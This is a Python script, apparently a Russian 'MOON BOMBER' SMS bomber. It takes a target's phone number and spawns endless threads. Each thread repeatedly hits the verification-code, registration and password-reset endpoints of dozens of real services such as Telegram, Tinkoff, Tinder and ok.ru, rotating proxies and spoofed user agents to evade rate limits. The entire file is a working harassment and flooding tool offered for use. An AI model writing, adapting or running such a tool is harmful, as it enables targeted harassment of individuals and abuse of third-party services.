import os, random, time, threading
os.system('mode 75, 22')
if os.name == 'nt':
    os.system('title MOON BOMBER')
else:
    sys.stdout.write("\x1b]2;MOON BOMBER\x07")
try:
 import requests
except:
    if os.name == 'nt':
        os.system('pip install requests')
    else:
        os.system('pip3 install requests')    
try:
    from colorama import Fore, init
except:
    if os.name == 'nt':
        os.system('pip install colorama')
    else:
        os.system('pip3 install colorama') 
if os.name == 'nt':
    init()
else: pass    


def cls():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')            
###########
wh = Fore.LIGHTWHITE_EX
ques = f'{wh} [{Fore.LIGHTCYAN_EX}?{wh}]'
suc = f'{wh}[{Fore.LIGHTCYAN_EX}+{wh}]'
fsuc = Fore.LIGHTCYAN_EX
err = f'{wh} [{Fore.RED}-{wh}]'
ferr = Fore.RED

###########
def main():
    try:
     proxies = open('assets/proxies.txt', 'r').read().splitlines()
     leng = len(open('assets/proxies.txt').read())
     if leng < 1:
        print(f'{ferr}{err} Ошибка!{wh} Добавьте прокси в файл proxies.txt') 
        input()
        return main()        
    except:
        print(f'{ferr}{err} Ошибка!{wh} Добавьте прокси в файл proxies.txt') 
        input()
        return main()
    phone = input(f'\n\n\n\n\n\n\n\n                              {fsuc}MOON {wh}BOMBER\n\n\n\n\n\n\n\n\n{ques}{wh} Номер телефона:{fsuc} ')
    delay = input(f'{ques}{wh} Задержка (В секундах):{fsuc} ')
    dur = float(input(f'{ques}{wh} Длительность (В секундах):{fsuc} '))
    sagents = ['Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/24.0.1292.0 Safari/537.14','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36','Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)','Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36','Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1500.55 Safari/537.36','Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36']
    if phone.startswith('8'):
       phone = phone.replace('8', '7')
    elif phone.startswith('+7'):
       phone = phone.replace('+7', '7')
    def service():
     while True:
      agent = random.choice(sagents)   
      header = {
      "X-Requested-With": "XMLHttpRequest",    
      'User-Agent': agent
      }
      payload = {'phone': phone}
      payloadd = {'phone': '+'+phone} 
       #смсбомбер.co
      try:
        time.sleep(float(delay))   
        r = requests.post(f'https://smsbomber.co.in/sms.php', headers=header,data = {'mobile': phone,'number': '20' })
      except:
         pass 
         
    #смсбомбер.com
      try:
        time.sleep(float(delay))                                         
        r = requests.post(f'https://mytoolstown.com/smsbomber/', headers=header,data = {'country_code': '7','mobno': phone[1:11],'count': '100', '_token': 'fM4jY6HNoOpiNrAI7A5tjPzNAqFzBslNGCkHFkoD','sent_count': '0', 'wait_sec': '1000' })
      except:
         pass 
        #праймм

      try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={agent}, proxies={'https://p.grabtaxi.com':random.choice(proxies)})
      except: pass  
      try:
        time.sleep(float(delay))   
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone}, proxies ={'https://api-prime.anytime.global': random.choice(proxies)})
      except:
         pass      
       #смсбомбер.online
      try:
        time.sleep(float(delay))   
        r = requests.post(f'https://smsbomber.online/index.php', headers=header,data = {'number': phone,'count': '100', 'submit': 'Sumbit' })
      except:
         pass
         

      try:      
       time.sleep(float(delay))   
       #юла  
       r = requests.post('https://youla.ru/web-api/auth/request_code', headers=header, data=payload, proxies ={'https://youla.ru': random.choice(proxies)})
    
      except: pass
       
      time.sleep(float(delay))
      try:
      #тг
       r = requests.get('https://my.telegram.org/auth/send_password', headers=header, data=payloadd, proxies ={'https://my.telegram.org': random.choice(proxies)})
    
      except:
        pass
               
      time.sleep(float(delay))

      #финдклон
      try:
       rr = requests.get(f'https://findclone.ru/register?phone=+{phone}', headers=header, data=payload, proxies ={'https://findclone.ru': random.choice(proxies)})
      except:
         pass
      time.sleep(float(delay))      
     #ok
      try:     
       rr = requests.post(f'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', headers=header, data={'st.r.phone': '+'+phone}, proxies ={'https://ok.ru': random.choice(proxies)})

      except:
         pass      
       

 
     #тинькоф
      time.sleep(float(delay))
      try:
       r = requests.post('https://api.tinkoff.ru/v1/sign_up', headers=header, data=payloadd, proxies ={'https://api.tinkoff.ru': random.choice(proxies)})
    
      except:
        pass
               
     #клауд
      time.sleep(float(delay))    
      try:
       r = requests.post('https://cloud.mail.ru/api/v2/notify/applink', headers=header, data=payloadd, proxies ={'https://cloud.mail.ru': random.choice(proxies)})
    
      except:
        pass          
       
      time.sleep(float(delay))    
      #санлайт
      try:
       r = requests.post('https://api.sunlight.net/v3/customers/authorization/', headers=header, data=payload, proxies ={'https://api.sunlight.net': random.choice(proxies)})
    
      except:
        pass
       
      time.sleep(float(delay)) 
       #ситилинк
      try:
       r = requests.post(f'https://www.citilink.ru/registration/confirm/phone/{phone}/', headers=header, proxies ={'https://www.citilink.ru': random.choice(proxies)})
    
      except:
        pass   
                 
     #иви    
      time.sleep(float(delay)) 
      try:
       r = requests.post(f'https://api.ivi.ru/mobileapi/user/register/phone/v6', headers=header, proxies ={'https://api.ivi.ru': random.choice(proxies)})
    
      except:
        pass   
       
      #кабвайфай
      time.sleep(float(delay))       
      try:
       r = requests.post(f'https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': phone},headers={'App-ID': 'cabinet'}, proxies ={'https://cabinet.wi-fi.ru': random.choice(proxies)})
    
      except:
        pass
       
      time.sleep(float(delay)) 
     #индрайвер
      try:
       requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"}, proxies ={'https://terra-1.indriverapp.com': random.choice(proxies)})
    
      except:
        pass        
       

     #сбис
      time.sleep(float(delay))      
      try:
       requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'}, proxies ={'https://online.sbis.ru': random.choice(proxies)})
    
      except:
        pass      
       
     #пицца
      time.sleep(float(delay))      
      try:
       requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phone, '_token':'*'}, proxies ={'https://pizzahut.ru': random.choice(proxies)})
    
      except:
        pass
       

     #коронапей
      time.sleep(float(delay))      
      try:
       requests.post('https://koronapay.com/transfers/online/api/users/otps', headers = header, data=payload, proxies ={'https://koronapay.com': random.choice(proxies)})
    
      except:
        pass
     


     #финам
      time.sleep(float(delay))      
      try:
       requests.post('https://www.finam.ru/api/smslocker/sendcode', data=payloadd, proxies ={'https://www.finam.ru': random.choice(proxies)})
    
      except:
        pass  
     #шафа
      time.sleep(float(delay)) 
      try:
       r = requests.post("https://shafa.ua/api/v3/graphiql", json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+" + phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}, headers=header, proxies ={'https://shafa.ua': random.choice(proxies)})
    
      except:
        pass  
                

     #аська
      time.sleep(float(delay)) 
      try:
       r = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763",}, headers=header, proxies ={'https://www.icq.com': random.choice(proxies)})
      except:
        pass  


      try:
        requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, proxies={'https://api.carsmile.com': random.choice(proxies)})
      except: pass        
      try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+'+phone}, proxies ={'https://lenta.com': random.choice(proxies)})
      except: pass  
      #тиндер
      time.sleep(float(delay)) 
      try:
       r = requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone}, headers=header, proxies ={'https://api.gotinder.com': random.choice(proxies)})
      except:
        pass   
      try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, proxies={'https://app.karusel.ru': random.choice(proxies)})
      except: pass  
      time.sleep(float(delay))
      try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone}, proxies={'https://myapi.beltelecom.by': random.choice(proxies)})
      except: pass 
      time.sleep(float(delay)) 
      try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.1999','mobilePhone': phone[1:],'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'}, proxies={'https://ib.psbank.ru':random.choice(proxies)})
      except: pass

      time.sleep(float(delay))
      try:
       requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={agent}, proxies={'https://api.mtstv.ru':random.choice(proxies)}) 
      except: pass 
      time.sleep(float(delay))
      try:
        requests.post('https://www.rabota.ru/remind', data={'credential': phone}, proxies={'https://www.rabota.ru':random.choice(proxies)}) 
      except: pass  
    print(f' {suc}{wh} Команда{fsuc} успешно{wh} отправлена на {fsuc}30{wh} сервисов')

    sec = time.time()
    while time.time()<=sec+dur:
     threading.Thread(target = service).start()  


if __name__=='__main__':
    main()


